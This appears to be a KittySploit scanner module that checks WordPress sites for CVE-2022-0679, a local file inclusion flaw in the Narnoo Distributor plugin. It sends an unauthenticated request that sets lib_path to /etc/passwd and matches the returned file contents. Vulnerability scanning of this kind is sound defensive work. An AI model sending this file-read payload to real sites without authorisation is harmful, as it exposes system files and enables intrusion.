#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Narnoo Distributor plugin 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Narnoo Distributor <=2.5.1 - Local File Inclusion Detection',
        'description': 'WordPress Narnoo Distributor plugin 2.5.1 and prior is susceptible to local file inclusion. The plugin does not validate and sanitize the lib_path parameter before being passed into a call to require() via the narnoo_distributor_lib_request AJAX action, and the content of the file is displayed in the response as JSON data. This can also lead to a remote code execution vulnerability depending on system and configuration.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'narnoo-distributor',
            'wordpress',
            'wp-plugin',
            'wpscan',
            'wp',
            'rce',
            'unauth',
            'lfi',
            'narnoo_distributor_project',
            'vkev',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/0ea79eb1-6561-4c21-a20b-a1870863b0a8',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0679',
            'https://github.com/cyllective/CVEs',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0679',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'}, data='action=narnoo_distributor_lib_request&lib_path=/etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='WordPress Narnoo Distributor <=2.5.1 - Local File Inclusion detected', path=path)
            return True
        return False

